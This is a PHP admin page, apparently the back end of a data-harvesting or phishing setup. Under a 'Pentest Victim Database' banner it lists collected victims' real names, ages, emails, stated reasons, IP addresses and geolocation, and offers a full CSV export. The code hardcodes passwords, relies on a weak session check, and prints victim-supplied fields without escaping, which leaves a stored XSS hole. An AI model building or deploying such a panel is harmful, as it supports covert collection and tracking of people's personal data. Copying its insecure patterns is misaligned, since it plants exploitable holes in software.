<?php
// Same DB config as save.php
$host = 'localhost'; $dbname = 'pentest_db'; $username = 'pentest_user'; $password = 'your_secure_password';
$pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Simple auth (change in production)
session_start();
if (!isset($_SESSION['admin']) || $_SESSION['admin'] !== 'pentest2026') {
    if ($_POST['pass'] === 'admin2026') {
        $_SESSION['admin'] = 'pentest2026';
    } else {
        die('Access Denied');
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Pentest Admin Panel</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
        th { background: #333; }
        .ip { color: #00ffff; font-family: monospace; }
        .geo { background: #002200; padding: 5px; border-radius: 3px; }
        pre { background: #000; padding: 10px; border-radius: 5px; overflow: auto; }
    </style>
</head>
<body>
    <h1>🎯 Pentest Victim Database</h1>
    <p>Total Records: <?php echo $pdo->query("SELECT COUNT(*) FROM victims")->fetchColumn(); ?></p>

    <table>
        <tr>
            <th>ID</th><th>Type</th><th>Name</th><th>Age</th><th>Email</th><th>Reason</th><th>IP</th><th>Geo</th><th>Timestamp</th>
        </tr>
        <?php
        $stmt = $pdo->query("SELECT * FROM victims ORDER BY timestamp DESC LIMIT 100");
        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
            echo "<tr>";
            echo "<td>{$row['id']}</td>";
            echo "<td>{$row['type']}</td>";
            echo "<td>{$row['real_name']}</td>";
            echo "<td>{$row['age']}</td>";
            echo "<td><a href='mailto:{$row['email']}'>{$row['email']}</a></td>";
            echo "<td>" . substr($row['reason'], 0, 100) . "...</td>";
            echo "<td class='ip'><strong>{$row['ip']}</strong></td>";
            echo "<td class='geo'><pre>" . htmlspecialchars($row['geo']) . "</pre></td>";
            echo "<td>{$row['timestamp']}</td>";
            echo "</tr>";
        }
        ?>
    </table>

    <h3>Export CSV</h3>
    <a href="export.php" style="background: #00ff00; color: black; padding: 10px; text-decoration: none;">📥 Download All Data</a>
</body>
</html>
